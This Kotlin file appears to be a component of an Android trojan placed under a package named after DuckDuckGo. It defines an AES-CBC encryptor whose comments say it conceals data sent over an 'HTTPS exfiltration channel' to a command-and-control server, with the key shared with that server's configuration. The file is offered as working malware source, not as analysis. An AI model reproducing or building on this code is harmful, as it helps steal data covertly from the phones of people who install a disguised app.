package com.duckduckgo.trojan.impl

import android.util.Base64
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * AES-256-CBC application-level encryption for the HTTPS exfiltration channel.
 *
 * Wire format: Base64( IV[16 bytes] || AES-CBC-ciphertext )
 *
 * The key must match AES_SECRET_KEY in server/config.py (via C2NetworkModule.AES_KEY).
 * The server decrypts in server/crypto.py using the same key and IV prefix convention.
 */
object AesExfiltrator {

    private const val ALGORITHM = "AES/CBC/PKCS5Padding"

    fun encrypt(plaintext: String, key: String = C2NetworkModule.AES_KEY): String {
        val keySpec = SecretKeySpec(key.toByteArray(Charsets.UTF_8), "AES")
        val cipher = Cipher.getInstance(ALGORITHM)
        val iv = ByteArray(16).also { SecureRandom().nextBytes(it) }
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, IvParameterSpec(iv))
        val encrypted = cipher.doFinal(plaintext.toByteArray(Charsets.UTF_8))
        // Prepend IV so the server can extract it for decryption.
        val combined = iv + encrypted
        return Base64.encodeToString(combined, Base64.NO_WRAP)
    }
}
